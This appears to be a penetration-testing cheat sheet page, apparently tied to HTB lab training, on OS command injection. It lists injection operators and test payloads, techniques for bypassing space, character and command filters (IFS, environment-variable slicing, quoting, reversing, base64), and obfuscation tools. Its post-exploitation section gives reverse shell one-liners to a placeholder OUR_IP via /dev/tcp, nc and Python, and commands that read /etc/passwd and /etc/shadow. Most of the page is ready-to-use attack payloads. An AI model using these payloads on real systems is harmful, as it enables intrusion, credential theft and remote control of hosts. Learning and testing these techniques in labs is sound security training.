---
title: "Command Injections"
description: "Operators, filter bypasses, blind injection, and evasion techniques."
sidebar:
  order: 6
  label: "Command Injections"
---
> OS command injection when user input is passed unsanitized to system execution functions. Bypassing character, space, and command filters using obfuscation.

---


## Injection Operators

| Operator | Character | URL-encoded | Executes |
|----------|----------|-------------|---------|
| Semicolon | `;` | `%3b` | Both |
| Newline | `\n` | `%0a` | Both — **frequently unfiltered** |
| Background | `&` | `%26` | Both (2nd first) |
| Pipe | `\|` | `%7c` | 2nd only |
| AND | `&&` | `%26%26` | Both (if 1st succeeds) |
| OR | `\|\|` | `%7c%7c` | 2nd only (if 1st fails) |
| Sub-shell | ` `` ` | `%60%60` | Both (Linux) |
| Sub-shell | `$()` | `%24%28%29` | Both (Linux) |

```bash
# Basic test payloads
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
|| whoami          # when the first command fails
127.0.0.1%0awhoami # newline as separator (harder to filter)
```

---

## Bypass — Frontend (JS Validation)

```bash
# Intercept with Burp -> modify the field directly in the request
# 1. Submit normal request (valid IP)
# 2. CTRL+R -> Repeater
# 3. Change ip=127.0.0.1 -> ip=127.0.0.1; whoami
# 4. CTRL+U -> URL encode the payload
# 5. Send

# Alternative: DevTools -> delete JS validation
# CTRL+SHIFT+C -> select input -> delete onchange="validate(this)"
```

---

## Bypass — Filtered Spaces

```bash
# Technique 1: Tab (%09) — works on Linux and Windows
127.0.0.1%0a%09whoami

# Technique 2: ${IFS} — IFS is space+tab in bash
127.0.0.1%0a${IFS}whoami
cat${IFS}/etc/passwd

# Technique 3: Brace expansion — space-less
{ls,-la}
{cat,/etc/passwd}
127.0.0.1%0a{whoami}

# Combination with newline + IFS:
127.0.0.1%0a${IFS}cat${IFS}/etc/passwd
```

---

## Bypass — Filtered Characters (/ ; . etc.)

### Linux — Environment Variables

```bash
# Obtain / from $PATH
echo ${PATH:0:1}          # -> /
${PATH:0:1}etc${PATH:0:1}passwd  # -> /etc/passwd in the payload

# Obtain ; from $LS_COLORS
echo ${LS_COLORS:10:1}    # -> ;

# Building paths without /
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Verify available variables
printenv    # list all environment variables
```

### Linux — Character Shifting (Any Character)

```bash
# man ascii -> view ASCII table -> char before the one we are looking for
# \ = ASCII 92, before it is [ = ASCII 91
echo $(tr '!-}' '"-~'<<<[)   # -> \

# ; = ASCII 59, before it is : = ASCII 58
echo $(tr '!-}' '"-~'<<<:)   # -> ;
```

### Windows CMD

```cmd
# Obtain \ from %HOMEPATH%
echo %HOMEPATH:~6,-11%        # -> \

# With PowerShell
$env:HOMEPATH[0]              # -> \
$env:PROGRAMFILES[10]         # -> \
```

---

## Bypass — Filtered Commands

### Quotes (Linux + Windows)

```bash
# Insert single or double quotes between command characters
w'h'o'am'i      # -> whoami (works in bash and PowerShell)
w"h"o"am"i      # -> whoami
c'a't /etc/passwd

# Rule: do not mix types; number of quotes must be even
```

### Backslash and $@ (Linux Only)

```bash
w\ho\am\i       # backslash ignored by bash
who$@ami        # $@ ignored by bash (empty special argument)
```

### Caret ^ (Windows CMD Only)

```cmd
who^ami         # -> whoami
```

---

## Advanced Bypass — Command Obfuscation

### Case Manipulation

```bash
# Windows — CMD/PowerShell case-insensitive
WhOaMi
WHOAMI

# Linux — dynamically convert to lowercase
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Without spaces (combine with IFS):
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

### Reversed Commands (Linux)

```bash
# Obtain reversed command
echo 'whoami' | rev      # -> imaohw
echo 'cat /etc/passwd' | rev  # -> dwssap/cte/ tac

# Execute reversed in payload
$(rev<<<'imaohw')
$(rev<<<'dwssap/cte/ tac')

# Windows PowerShell
"whoami"[-1..-20] -join ''       # -> imaohw
iex "$('imaohw'[-1..-20] -join '')"
```

### Base64 Encoded (Linux)

```bash
# Encode complete command (avoids filtered characters)
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Execute decoded in bash (uses <<< to avoid pipe |)
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# If "bash" is filtered: use sh
sh<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)

# If "base64" is filtered: openssl
openssl enc -d -base64<<<Y2F0IC9ldGMvcGFzc3dk | sh
```

### Base64 Encoded (Windows PowerShell)

```powershell
# Convert complete command to base64 UTF-16 (PowerShell requirement)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# -> dwBoAG8AYQBtAGkA

# On Linux to generate the Windows payload:
echo -n whoami | iconv -f utf-8 -t utf-16le | base64   # -> dwBoAG8AYQBtAGkA

# Execute in PowerShell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

## Automated Obfuscation Tools

### Bashfuscator (Linux)

```bash
# Install
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Use (short and simple payload)
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Verify that it works
bash -c '<payload_generado>'
```

### DOSfuscation (Windows)

```powershell
# Install
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Interactive use
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1    # -> generates obfuscated payload

# Also available in Pwnbox (pwsh)
```

---

## Detection — Identifying What Is Filtered

```bash
# Test operators one by one until finding the one that passes:
127.0.0.1;           # -> blocked?
127.0.0.1&           # -> blocked?
127.0.0.1|           # -> blocked?
127.0.0.1%0a         # newline -> passes?

# If the operator passes, add space:
127.0.0.1%0a whoami  # blocked by space?

# If the space is filtered, add command:
127.0.0.1%0a%09whoami  # blocked by "whoami"?

# If the command is filtered:
127.0.0.1%0a%09w'h'o'am'i  # quotes -> bypasses?
```

---

## Useful Post-Exploitation Commands

```bash
# Identification
whoami; id; hostname; uname -a

# Network
ip a; ifconfig; netstat -antp; cat /etc/hosts

# Sensitive files
cat /etc/passwd
cat /etc/shadow       # if we have permissions
find / -name "*.conf" 2>/dev/null
find / -name "config.php" 2>/dev/null

# Reverse shell from webshell (if there is outbound connection)
bash -i >& /dev/tcp/OUR_IP/4444 0>&1
nc -e /bin/bash OUR_IP 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("OUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Pitfalls / Gotchas

- **Semicolon in Windows CMD:** `;` does not work as an operator in CMD. Use `&` or `&&`. It does work in PowerShell.
- **Newline `%0a` is the most reliable:** it is rarely blacklisted because it is part of HTTP semantics. Always try it first.
- **`||` requires the 1st to fail:** if the first command succeeds, the second does not execute. Use `|| cmd` without an IP to guarantee ping failure.
- **`${IFS}` only in Linux bash:** it does not work in sh or zsh in the same way. Verify the server's shell.
- **Obfuscation + space filters:** when using advanced techniques like `tr` or `base64`, ensure there are no spaces in the payload. Use `%09` or `${IFS}`.
- **Mixing quotes:** do not mix `'` and `"` in the same word. Quotes must be paired.
- **Backslash `\` in blacklist:** if `\` is also filtered, use the quotes method instead.
- **Base64 with `|`:** if the pipe `|` is filtered, use `<<<` (herestring) to pass data. `bash<<<$(base64 -d<<<...)` avoids the pipe.
- **Bashfuscator long payload:** without `-s 1 -t 1`, it generates payloads of thousands of characters. Always use flags to limit the size.
- **WAF vs app filter:** if the error says "invalid input" within the form → PHP app filter. If it responds with a different page (403, etc.) → WAF. Bypass techniques differ.

---

## Related Cheatsheets

- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting and modifying requests to bypass frontend validation
- [File Inclusion](/en/metodologias/web/file-inclusion/) — LFI sometimes turns command injection into RFI
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells to scale from command injection
- [File Upload Attacks](/en/metodologias/web/file-upload-attacks/) — command injection in the uploaded filename
- [Web Attacks](/en/metodologias/web/web-attacks/) — SSRF and XXE can also lead to indirect command injection
